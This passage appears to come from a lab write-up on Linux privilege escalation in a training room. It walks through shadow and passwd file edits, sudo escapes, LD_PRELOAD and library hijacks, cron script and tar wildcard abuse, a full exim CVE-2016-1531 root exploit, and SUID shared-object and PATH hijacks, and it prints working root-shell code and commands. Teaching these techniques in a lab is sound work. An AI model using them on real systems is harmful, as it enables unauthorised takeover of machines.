+<p>We can now edit the <code>/etc/shadow</code> file on the target machine and replace the existing password hash with the one we generated above.</p>
+<p><img alt="Modify Shadow" src="../../../assets/images/thm/linuxprivesc/22-shadow_modify.png" /></p>
+<p>Save the file and exit. We can now use our new credentials <code>root:pass123</code> to privilege escalate to the root user.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="go">su root</span>
+</code></pre></div>
+<img alt="Shadow Write Root" src="../../../assets/images/thm/linuxprivesc/23-shadow_write_root.png" /></p>
+<h2 id="task-5-weak-file-permissions-writable-etcpasswd">Task 5 - Weak File Permissions - Writable /etc/passwd<a class="headerlink" href="#task-5-weak-file-permissions-writable-etcpasswd" title="Permanent link">&para;</a></h2>
+<p>In this task, we will be looking at weak file permissions on the <code>/etc/passwd</code> file. The <code>/etc/passwd</code> file is normally globally-readable and only the super user has permissions to write to it. A <code>/etc/passwd</code> file with global write permissions allows any user to modify the contents and give themselves root permissions. For more information on exploiting the <code>/etc/passwd</code> file, see <a href="../../../notes/privesc_linux/passwdshadow/">Passwd/Shadow File</a>.</p>
+<p>Let's look at the permissions on the <code>/etc/passwd</code> file for this task.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="go">ls -l /etc/passwd</span>
+</code></pre></div>
+<img alt="Passwd Permissions" src="../../../assets/images/thm/linuxprivesc/24-passwd_perm.png" /></p>
+<p>As we can see from the image above, the <code>/etc/passwd</code> file has been marked as writeable by all other users present on the system. As a consequence, we can simply edit the contents of <code>/etc/passwd</code> file and gain root access by appending a new user with root privileges to the file.</p>
+<p>Let's begin by generating a new password for our new user using the <em>openssl</em> utility.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="go">openssl passwd pass123</span>
+</code></pre></div>
+<img alt="New Password Hash" src="../../../assets/images/thm/linuxprivesc/25-passwd_new_hash.png" /></p>
+<p>We can now edit the <code>/etc/passwd</code> file by adding a new user with root privileges with the above password hash.</p>
+<p><img alt="New Root User" src="../../../assets/images/thm/linuxprivesc/26-passwd_new_root.png" /></p>
+<p>We can now switch to the new user using the new password.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="go">su newroot</span>
+</code></pre></div>
+<img alt="Passwd PrivEsc" src="../../../assets/images/thm/linuxprivesc/27-passwd_root.png" /></p>
+<h2 id="task-6-sudo-shell-escape-sequences">Task 6 - Sudo - Shell Escape Sequences<a class="headerlink" href="#task-6-sudo-shell-escape-sequences" title="Permanent link">&para;</a></h2>
+<p>We can list all programs which sudo allows us to run by using the following command:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="go">sudo -l</span>
+</code></pre></div>
+By leveraging <a href="https://gtfobins.github.io/">GTFOBins</a>, we can attempt to gain privilege escalation with the programs listed via an escape sequence.</p>
+<p>Let's list all the programs sudo permits us to run as a low privileged user for this task.</p>
+<p><img alt="sudo -l" src="../../../assets/images/thm/linuxprivesc/28-sudo-l.png" /></p>
+<p>Note that each of the programs listed can be run without a password needed to be supplied due to the <code>NOPASSWD</code> attribute.</p>
+<p>Let's go ahead and see if we can find a privilege escalation vector using the <code>/usr/bin/find</code> binary. Searching the binary on the GTFOBins, we find that if the <code>/usr/bin/find</code> binary is allowed to run as superuser by <em>sudo</em>, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. We can abuse this by using the <code>-exec</code> flag to execute any system binary (such as <code>/bin/bash</code>) with root privileges.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="go">sudo find . -exec /bin/bash \; -quit</span>
+</code></pre></div>
+<img alt="sudo -l Find PrivEsc" src="../../../assets/images/thm/linuxprivesc/29-sudo-l_root.png" /></p>
+<p>Note that privilege escalation vectors exist all of the remaining binaries (except apache2) listed when running the <code>sudo -l</code> command.</p>
+<h2 id="task-7-sudo-environment-variables">Task 7 - Sudo - Environment Variables<a class="headerlink" href="#task-7-sudo-environment-variables" title="Permanent link">&para;</a></h2>
+<p>Sudo can be configured to inherit certain environment variables from the user's environment. We can check which environment variables are inherited by looking for the <em>env_keep</em> option when running the <code>sudo -l</code> command.</p>
+<p><img alt="Sudo Environment Variable" src="../../../assets/images/thm/linuxprivesc/30-sudo_env.png" /></p>
+<p>In the above example, the <em>LD_PRELOAD</em> and <em>LD_LIBRARY_PATH</em> are both inherited from the user's environment. <em>LD_PRELOAD</em> loads a shared object before any others when a program is run. <em>LD_LIBRARY_PATH</em> provides a list of directories where shared libraries are searched for first.</p>
+<p>We can exploit this by creating a shared object using the following code. Save the code to a file in <code>/tmp/preload.c</code>.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span>
+<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>
+<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="kt">void</span><span class="w"> </span><span class="nf">_init</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a><span class="w">        </span><span class="n">unsetenv</span><span class="p">(</span><span class="s">&quot;LD_PRELOAD&quot;</span><span class="p">);</span>
+<a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a><span class="w">        </span><span class="n">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+<a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a><span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash -p&quot;</span><span class="p">);</span>
+<a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a><span class="p">}</span>
+</code></pre></div>
+Then create the shared object using the following syntax:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="go">gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c</span>
+</code></pre></div>
+<img alt="Sudo Env Shared Object" src="../../../assets/images/thm/linuxprivesc/31-sudo_env_shared_object.png" /></p>
+<p>We can now spawn an interactive shell by running one of the programs listed when we run the <code>sudo -l</code> command, while setting the <em>LD_PRELOAD</em> environment to the full path of the new shared object. The interactive shell will be spawned with root privileges due to the listed binary executing with root permissions. Let's see this in action.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="go">sudo LD_PRELOAD=/tmp/preload.so [binary_name]</span>
+</code></pre></div>
+<img alt="Sudo Env Shared Object Root" src="../../../assets/images/thm/linuxprivesc/32-sudo_env_shared_object_root.png" /></p>
+<p>Alternatively, we can also exploit shared libraries used by a program when executing. For example, let's look at the shared libraries used by <code>/usr/sbin/apache2</code> by running the following command:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="go">ldd /usr/sbin/apache2</span>
+</code></pre></div>
+<img alt="Sudo Env Shared Lib" src="../../../assets/images/thm/linuxprivesc/33-sudo_env_shared_lib.png" /></p>
+<p>Now let's create a shared object with the same name as one of the listed libraries (eg: libcrypt.so.1) using the following code. Save the code to a file in <code>/tmp/lib_path.c</code>.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>
+<a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">hijack</span><span class="p">()</span><span class="w"> </span><span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">));</span>
+<a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>
+<a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a><span class="kt">void</span><span class="w"> </span><span class="nf">hijack</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a><span class="w">        </span><span class="n">unsetenv</span><span class="p">(</span><span class="s">&quot;LD_LIBRARY_PATH&quot;</span><span class="p">);</span>
+<a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a><span class="w">        </span><span class="n">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+<a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a><span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash -p&quot;</span><span class="p">);</span>
+<a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a><span class="p">}</span>
+</code></pre></div>
+<p>Then create the shared object using the following syntax:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="go">gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/library_path.c</span>
+</code></pre></div>
+<img alt="Sudo Env Lib Path" src="../../../assets/images/thm/linuxprivesc/34-sudo_env_shared_lib_gcc.png" /></p>
+<p>We can now go ahead and execute the binary while supplying the <em>LD_LIBRARY_PATH</em> environment variable to where our malicious shared object resides. This will spawn an interactive root shell thus gaining our privilege escalation.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="go">sudo LD_LIBRARY_PATH=/tmp apache2</span>
+</code></pre></div>
+<img alt="Sudo Env Shared Lib PrivEsc" src="../../../assets/images/thm/linuxprivesc/35-sudo_env_shared_lib_root.png" /></p>
+<h2 id="task-8-cron-jobs-file-permissions">Task 8 - Cron Jobs - File Permissions<a class="headerlink" href="#task-8-cron-jobs-file-permissions" title="Permanent link">&para;</a></h2>
+<p>By default, Cron runs as root when executing <code>/etc/crontab</code>. Scripts executed by Cron that are editable by an unprivileged user become a vector for privilege escalation. For more information on privilege escalation using Cron Jobs with weak file permissions, see <a href="../../../notes/privesc_linux/crontab/">Cron Jobs</a>.</p>
+<p>Let's begin by looking at the contents of <code>/etc/crontab</code> in order to identify any possible targets.</p>
+<p><img alt="Crontab" src="../../../assets/images/thm/linuxprivesc/36-crontab.png" /></p>
+<p>In the above example, we can see that two scripts, <code>overwrite.sh</code> and <code>/usr/local/bin/compress.sh</code> ,are scheduled to run every minute. Let's locate the full path of <code>overwrite.sh</code> and look at its file permissions.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="go">locate overwrite.sh</span>
+</code></pre></div>
+<img alt="Cron Job Script Perm" src="../../../assets/images/thm/linuxprivesc/37-crontab_overwrite.png" /></p>
+<p>Looking at the permissions on the script, we see that it is writeable by any user on the machine. We can exploit this misconfiguration to gain privilege escalation by modifying the script to make a copy of the <code>/bin/bash</code> binary and set the SUID bit on it. Let's see this in action.</p>
+<p>Let's modify the <code>/usr/local/bin/overwrite.sh</code> file with the following commands:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="go">cp /bin/bash /tmp/rootbash</span>
+<a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="go">chmod u+s /tmp/rootbash</span>
+</code></pre></div>
+<img alt="Crontab Root Bash SUID" src="../../../assets/images/thm/linuxprivesc/38-crontab_overwrite_rootbash.png" /></p>
+<p>Now all we need to do is wait for Cron to run the scheduled task. Execute the <code>/tmp/rootbash</code> binary using the following command to gain root access:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="go">/tmp/rootbash -p</span>
+</code></pre></div>
+<img alt="Crontab Overwrite PrivEsc" src="../../../assets/images/thm/linuxprivesc/39-crontab_overwrite_privesc.png" /></p>
+<h2 id="task-9-cron-jobs-path-environment-variable">Task 9 - Cron Jobs - PATH Environment Variable<a class="headerlink" href="#task-9-cron-jobs-path-environment-variable" title="Permanent link">&para;</a></h2>
+<p>If absolute path for a script in a scheduled task in <code>/etc/crontab</code> file is not defined and the PATH variable contains a globally writeable directory as its first entry, we can force Cron to execute a malicious script we control to gain privilege escalation.</p>
+<p>Let's begin by looking at the contents of the <code>/etc/crontab</code> file again.</p>
+<p><img alt="Crontab Path" src="../../../assets/images/thm/linuxprivesc/40-crontab_path.png" /></p>
+<p>Note that the PATH variable in the above image includes the <code>/home/user</code> directory as the first entry. When a binary or script is executed by Cron, this is will be the first directory it will look in before moving on to <code>/usr/local/sbin</code> and so on.</p>
+<p>Also note that the scheduled task which executes the <em>overwrite.sh</em> script does not define the absolute path for the script file. Since we have full read and write access to the <code>/home/user</code> directory, we can simply create our own malicious <em>overwrite.sh</em> file on the directory to gain privilege escalation. This is possible because when the scheduled task is executed Cron first looks in the <code>/home/user</code> directory for the <em>overwrite.sh</em> file before looking elsewhere.</p>
+<p>Let's create our <em>overwrite.sh</em> in the <code>/home/user</code> directory with the following content:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="ch">#!/bin/bash</span>
+<a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>
+<a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>cp<span class="w"> </span>/bin/bash<span class="w"> </span>/tmp/rootbash
+<a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a>chmod<span class="w"> </span>u+s<span class="w"> </span>/tmp/rootbash
+</code></pre></div>
+Give the script executable permission and wait for Cron to execute the scheduled task. Execute the new <em>rootbash</em> binary with the following syntax to get root access:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="go">/home/user/rootbash -p</span>
+</code></pre></div>
+<img alt="Crontab Path PrivEsc" src="../../../assets/images/thm/linuxprivesc/41-crontab_path_privesc.png" /></p>
+<h2 id="task-10-cron-jobs-wildcards">Task 10 - Cron Jobs - Wildcards<a class="headerlink" href="#task-10-cron-jobs-wildcards" title="Permanent link">&para;</a></h2>
+<p>A wildcard injection vulnerability occurs when a command uses the wildcard (*) character in an insecure way thus allowing an attacker to change the command's behaviour by injecting command flags. For more information, see <a href="../../../notes/privesc_linux/crontab/">Cron Jobs</a>.</p>
+<p>Let's look at the contents of the second cron job script <em>compress.sh</em>:</p>
+<p><img alt="Crontab Wildcard Injection" src="../../../assets/images/thm/linuxprivesc/42-crontab_wildcard.png" /></p>
+<p>We can see from the results that the script calls the <em>tar</em> utility is being run from the <code>/home/user</code> directory with a wildcard (*). Looking at GTFOBins, we can see that the command line options <code>--checkpoint</code> and <code>--checkpoint-action</code> can allow us to run other commands as part of a checkpoint feature.</p>
+<p>We can exploit this by forcing the checkpoint feature in the <em>tar</em> utility to execute our malicious script to get privilege escalation.</p>
+<p>Let's start by creating a script called <em>privesc.sh</em> which copies the <code>/bin/bash</code> binary to the <code>/home/user</code> directory and sets the SUID bit.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="ch">#!/bin/bash</span>
+<a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>
+<a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>cp<span class="w"> </span>/bin/bash<span class="w"> </span>/home/user/rootbash
+<a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>chmod<span class="w"> </span>u+s<span class="w"> </span>/home/user/rootbash
+</code></pre></div>
+Before proceeding, we need to give the script executable permissions. Now let's make two more files with the following syntax in the <code>/home/user</code> directory:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="go">touch /home/user/--checkpoint=1</span>
+<a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="go">touch /home/user/--checkpoint-action=exec=privesc.sh</span>
+</code></pre></div>
+When the <em>tar</em> utility in the cron job runs, the wildcard (<em>) will expand to include the files we created above. Since their filenames are valid commands, *tar</em> will recognize them as such and treat them as command line options rather than filenames.</p>
+<p>Once the scheduled task executes, we should see the <em>rootbash</em> binary in the <code>/home/user</code> folder with the SUID bit set. We can execute the <em>rootbash</em> binary to gain root access.</p>
+<p><img alt="Crontab Wildcard Injection PrivEsc" src="../../../assets/images/thm/linuxprivesc/44-crontab_wildcard_privesc.png" /></p>
+<h2 id="task-11-suidsgid-guid-executables-known-exploits">Task 11 - SUID/SGID (GUID) Executables - Known Exploits<a class="headerlink" href="#task-11-suidsgid-guid-executables-known-exploits" title="Permanent link">&para;</a></h2>
+<p>For more information regarding SUID/GUID permissions, see <a href="../../../notes/privesc_linux/suid/">SUID</a>.</p>
+<p>The following command can be used to identify binaries which have SUID and GUID permissions assigned to them:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="go">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null</span>
+</code></pre></div>
+Alternatively, we can use the following command to get the same result:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="go">find / -perm /u=s,g=s -type f -exec ls -l {} \; 2&gt;/dev/null</span>
+</code></pre></div>
+<img alt="SUID/SGID List" src="../../../assets/images/thm/linuxprivesc/45-suid_list.png" /></p>
+<p>In the task description, we are told that the <code>/usr/sbin/exim-4.84-3</code> binary has a known exploit for this particular version of the <em>exim</em> utility. We can confirm this by searching the <a href="https://www.exploit-db.com/">Exploit-DB</a> database which reveals a <a href="https://www.exploit-db.com/exploits/39535">Local Privilege Escalation</a> exploit.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="ch">#!/bin/sh</span>
+<a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="c1"># CVE-2016-1531 exim &lt;= 4.84-3 local root exploit</span>
+<a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a><span class="c1"># ===============================================</span>
+<a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="c1"># you can write files as root or force a perl module to</span>
+<a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a><span class="c1"># load by manipulating the perl environment and running</span>
+<a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a><span class="c1"># exim with the &quot;perl_startup&quot; arguement -ps. </span>
+<a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a><span class="c1">#</span>
+<a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a><span class="c1"># e.g.</span>
+<a id="__codelineno-43-9" name="__codelineno-43-9" href="#__codelineno-43-9"></a><span class="c1"># [fantastic@localhost tmp]$ ./cve-2016-1531.sh </span>
+<a id="__codelineno-43-10" name="__codelineno-43-10" href="#__codelineno-43-10"></a><span class="c1"># [ CVE-2016-1531 local root exploit</span>
+<a id="__codelineno-43-11" name="__codelineno-43-11" href="#__codelineno-43-11"></a><span class="c1"># sh-4.3# id</span>
+<a id="__codelineno-43-12" name="__codelineno-43-12" href="#__codelineno-43-12"></a><span class="c1"># uid=0(root) gid=1000(fantastic) groups=1000(fantastic)</span>
+<a id="__codelineno-43-13" name="__codelineno-43-13" href="#__codelineno-43-13"></a><span class="c1"># </span>
+<a id="__codelineno-43-14" name="__codelineno-43-14" href="#__codelineno-43-14"></a><span class="c1"># -- Hacker Fantastic </span>
+<a id="__codelineno-43-15" name="__codelineno-43-15" href="#__codelineno-43-15"></a><span class="nb">echo</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>CVE-2016-1531<span class="w"> </span><span class="nb">local</span><span class="w"> </span>root<span class="w"> </span>exploit
+<a id="__codelineno-43-16" name="__codelineno-43-16" href="#__codelineno-43-16"></a>cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/root.pm<span class="w"> </span><span class="s">&lt;&lt; EOF</span>
+<a id="__codelineno-43-17" name="__codelineno-43-17" href="#__codelineno-43-17"></a><span class="s">package root;</span>
+<a id="__codelineno-43-18" name="__codelineno-43-18" href="#__codelineno-43-18"></a><span class="s">use strict;</span>
+<a id="__codelineno-43-19" name="__codelineno-43-19" href="#__codelineno-43-19"></a><span class="s">use warnings;</span>
+<a id="__codelineno-43-20" name="__codelineno-43-20" href="#__codelineno-43-20"></a>
+<a id="__codelineno-43-21" name="__codelineno-43-21" href="#__codelineno-43-21"></a><span class="s">system(&quot;/bin/sh&quot;);</span>
+<a id="__codelineno-43-22" name="__codelineno-43-22" href="#__codelineno-43-22"></a><span class="s">EOF</span>
+<a id="__codelineno-43-23" name="__codelineno-43-23" href="#__codelineno-43-23"></a><span class="nv">PERL5LIB</span><span class="o">=</span>/tmp<span class="w"> </span><span class="nv">PERL5OPT</span><span class="o">=</span>-Mroot<span class="w"> </span>/usr/exim/bin/exim<span class="w"> </span>-ps
+</code></pre></div>
+We can download the above exploit into the <code>/tmp</code> directory, mark it as executable, and execute it to get root privileges.</p>
+<p><img alt="SUID Exploit" src="../../../assets/images/thm/linuxprivesc/46-suid_exploit.png" /></p>
+<p><img alt="SUID Exploit PrivEsc" src="../../../assets/images/thm/linuxprivesc/47-suid_exploit_privesc.png" /></p>
+<h2 id="task-12-suidsgid-executables-shared-object-injection">Task 12 - SUID/SGID Executables - Shared Object Injection<a class="headerlink" href="#task-12-suidsgid-executables-shared-object-injection" title="Permanent link">&para;</a></h2>
+<p>In this task, we are told that the <code>/usr/local/bin/suid-so</code> SUID binary is vulnerable to shared object injection. Let's confirm this by observing the behaviour of the binary when it is executed.</p>
+<p>Let's begin by executing the binary located at <code>/usr/local/bin/suid-so</code>. Note that a progress bar is displayed before the program exits.</p>
+<p><img alt="SUID Shared Object" src="../../../assets/images/thm/linuxprivesc/48-suid_shared_object.png" /></p>
+<p>We can look at the inner workings of the binary by using a utility called <em>strace</em>; <em>strace</em> is a diagnostic, debugging, and instructional userspace utility for the Linux OS. It intercepts and records the system calls which are called by a process and the signals which are received by a process.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="go">strace /user/local/bin/suid-so 2&gt;&amp;1 | grep -iE &quot;open|access|no such file:</span>
+</code></pre></div>
+<img alt="SUID Shared Object strace" src="../../../assets/images/thm/linuxprivesc/49-suid_shared_object_strace.png" /></p>
+<p>Notice that the the output shows that the <em>suid-so</em> binary tries to load the <code>/home/user/.config/libcalc.so</code> shared object which does not exist. We can exploit this to gain privilege escalation by creating a malicious shared object in the specified directory which will get called when the <em>suid-so</em> binary gets executed.</p>
+<p>Let's start by creating the <code>/home/user/.config</code> directory.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="go">mkdir /home/user/.config</span>
+</code></pre></div>
+We can now create a shared object with the following code which will spawn a Bash shell. Save the file to the <code>/home/user/.config</code> folder as <em>libcalc.c</em>.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a>
+<a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">inject</span><span class="p">()</span><span class="w"> </span><span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">));</span>
+<a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a>
+<a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a><span class="kt">void</span><span class="w"> </span><span class="nf">inject</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-46-7" name="__codelineno-46-7" href="#__codelineno-46-7"></a><span class="w">        </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<a id="__codelineno-46-8" name="__codelineno-46-8" href="#__codelineno-46-8"></a><span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash -p&quot;</span><span class="p">);</span>
+<a id="__codelineno-46-9" name="__codelineno-46-9" href="#__codelineno-46-9"></a><span class="p">}</span>
+</code></pre></div>
+<img alt="SUID Shared Object Malicious Code" src="../../../assets/images/thm/linuxprivesc/50-suid_shared_object_code.png" /></p>
+<p>Let's compile the code using <em>gcc</em> into a shared object using the following syntax:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="go">gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/.config/libcalc.c</span>
+</code></pre></div>
+<img alt="SUID Shared Object Compile" src="../../../assets/images/thm/linuxprivesc/51-suid_shared_object_so.png" /></p>
+<p>Now let's execute the <em>suid-so</em> binary and see if we get root privileges.</p>
+<p><img alt="SUID Shared Object PrivEsc" src="../../../assets/images/thm/linuxprivesc/52-suid_shared_object_privesc.png" /></p>
+<h2 id="task-13-suidsgid-executables-environment-variables">Task 13 - SUID/SGID Executables - Environment Variables<a class="headerlink" href="#task-13-suidsgid-executables-environment-variables" title="Permanent link">&para;</a></h2>
+<p>In this task, we are told that the <code>/usr/local/bin/suid-env</code> binary can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.</p>
+<p>Let's execute the binary to see what it does.</p>
+<p><img alt="SUID Environment Variables" src="../../../assets/images/thm/linuxprivesc/53-suid_env.png" /></p>
+<p>Looks like when the binary is executed, it starts the <em>apache2</em> webserver.</p>
+<p>Since we do not have the source code of the binary in question, we can't simply go through the code to figure out what is going on. A good next step is to run the <em>strings</em> utility on the binary. The <em>strings</em> utility prints the printable character sequences that are at least four character long and are followed by an unprintable character. It is a useful utility for determining the contents of a non-text file and is often the first step when reverse-engineering a binary.</p>
+<p>Let's run the <em>strings</em> utility against the binary and look at the results.</p>
+<p><img alt="SUID Environment Variables Strings" src="../../../assets/images/thm/linuxprivesc/54-suid_env_strings.png" /></p>
+<p>Based on the <em>strings</em> output, it looks like the binary attempts to start <em>apache2</em> using the <em>service</em> binary without specifying its absolute path (<code>/usr/sbin/service</code>). Note that the <em>service</em> binary typically has the SUID bit set by default.</p>
+<p>Let's exploit this by creating our own binary with the same name which loads a simple Bash shell. We can use the following code:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="w">        </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash -p&quot;</span><span class="p">);</span>
+<a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a><span class="p">}</span>
+</code></pre></div>
+<img alt="SUID Environment Variables Code" src="../../../assets/images/thm/linuxprivesc/55-suid_env_code.png" /></p>
+<p>Let's compile our code using <em>gcc</em>.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="go">gcc -o service /tmp/service.c</span>
+</code></pre></div>
+<img alt="SUID Environment Variables Compile" src="../../../assets/images/thm/linuxprivesc/56-suid_env_compile.png" /></p>
